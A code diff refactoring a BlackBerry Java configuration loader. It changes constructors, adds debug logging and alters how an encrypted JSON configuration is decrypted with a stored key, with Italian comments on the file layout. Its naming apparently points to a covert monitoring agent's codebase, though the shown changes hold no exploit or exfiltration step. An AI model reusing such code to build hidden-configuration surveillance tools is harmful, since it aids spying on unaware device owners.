@@ -5,9 +5,9 @@ import rpc.json.me.JSONException;
 import rpc.json.me.JSONObject;
 import rpc.json.me.JSONTokener;
 import blackberry.ActionManager;
-import blackberry.ModuleManager;
 import blackberry.EventManager;
 import blackberry.GeneralException;
+import blackberry.ModuleManager;
 import blackberry.Status;
 import blackberry.action.Action;
 import blackberry.crypto.EncryptionPKCS5;
@@ -52,22 +52,14 @@ public class Configuration {
 
     // public static final boolean DEBUG = Config.DEBUG;
 
-    /**
-     * Instantiates a new configuration.
-     * 
-     * @param resource
-     *            the resource
-     * @throws GeneralException
-     */
-    public Configuration(final byte[] resource) throws ConfigurationException {
-        status = Status.getInstance();
-        // Decrypt Conf
-        jsonResource = decryptConfiguration(resource);
-    }
-
     public Configuration(String jsonConf) throws ConfigurationException {
         status = Status.getInstance();
         jsonResource = jsonConf;
+    }
+
+    public Configuration(byte[] resource, int len, int offset) {
+        status = Status.getInstance();
+        jsonResource = decryptConfiguration(resource, len, offset);
     }
 
     /**
@@ -86,7 +78,11 @@ public class Configuration {
 
             // Parse and load configuration
             return parseConfiguration(instantiate, jsonResource);
-        } catch (final Exception rcse) {
+        } catch (final Exception e) {
+            //#ifdef DEBUG
+            debug.error(e);
+            debug.error("loadConfiguration");
+            //#endif
             return false;
         }
     }
@@ -296,13 +292,13 @@ public class Configuration {
      * @throws GeneralException
      *             the rCS exception
      */
-    private String decryptConfiguration(final byte[] rawConf) {
+    private String decryptConfiguration(final byte[] rawConf, int len, int offset) {
         /**
          * Struttura del file di configurazione
          * 
-         * |DWORD|DWORD|DWORD|DATA.....................|CRC| |---Skip----|-Len-|
+         * |DWORD|DATA.....................|CRC| |---Skip----|-Len-|
          * 
-         * Le prime due DWORD vanno skippate. La terza DWORD contiene la
+         * La prima DWORD contiene la
          * lunghezza del blocco di dati (inclusa la stessa Len) CRC e' il CRC
          * (cifrato) dei dati in chiaro, inclusa la DWORD Len
          */
@@ -310,7 +306,7 @@ public class Configuration {
         try {
             EncryptionPKCS5 crypto = new EncryptionPKCS5(Keys.getInstance()
                     .getConfKey());
-            final byte[] clearConf = crypto.decryptDataIntegrity(rawConf);
+            final byte[] clearConf = crypto.decryptDataIntegrity(rawConf,len,offset);
 
             String json = new String(clearConf);
 
